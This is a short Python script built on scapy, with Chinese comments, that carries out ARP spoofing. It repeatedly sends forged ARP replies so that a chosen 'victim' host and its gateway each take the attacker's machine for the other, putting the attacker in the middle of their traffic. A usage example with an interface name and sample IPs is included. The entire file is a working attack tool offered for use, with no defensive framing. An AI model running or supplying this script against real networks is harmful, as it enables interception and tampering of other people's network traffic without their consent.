from scapy.all import *
import argparse
import threading,time


def SendPayload(Interface,srcMac,tgtMac,gateWayMac,gatewayIP,tgtIP):
    print("[+] 目标MAC: {} 目标IP: {} 发送: 2 packets".format(tgtMac,tgtIP))
    # 生成ARP数据包,伪造网关欺骗目标计算机
    sendp(Ether(src=srcMac,dst=tgtMac)/ARP(hwsrc=srcMac,psrc=gatewayIP,hwdst=tgtMac,pdst=tgtIP,op=2),iface=Interface)
    # 生成ARP数据包,伪造目标计算机欺骗网关
    sendp(Ether(src=srcMac,dst=gatewayMac)/ARP(hwsrc=srcMac,psrc=tgtIP,hwdst=gatewayMac,pdst=gatewayIP,op=2),iface=Interface)
    print("-------------------------------------------------------------------------")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-i",dest="interface",help="输入接口名")
    parser.add_argument("-g",dest="gateway",help="输入网关地址")
    parser.add_argument("-t",dest="target",help="输入被害主机地址")
    args = parser.parse_args()

    # 使用方式: main.py -i "Realtek PCIe GbE Family Controller" -g 192.168.123.1 -t 192.168.123.8
    if args.gateway and args.target:
            srcMac = get_if_hwaddr(args.interface)                 # 通过接口名称获取本机MAC地址
            tgtMac = getmacbyip(args.target)                       # 通过IP地址获取目标计算机的MAC地址
            gatewayMac = getmacbyip(args.gateway)                  # 指定本机网段的网关MAC地址
            count=0
            while count<50:
                t = threading.Thread(target=SendPayload,args=(args.interface,srcMac,tgtMac,gatewayMac,args.gateway,args.target))
                t.start()
                t.join()
                time.sleep(1)
                count=count+1
    else:
        parser.print_help()
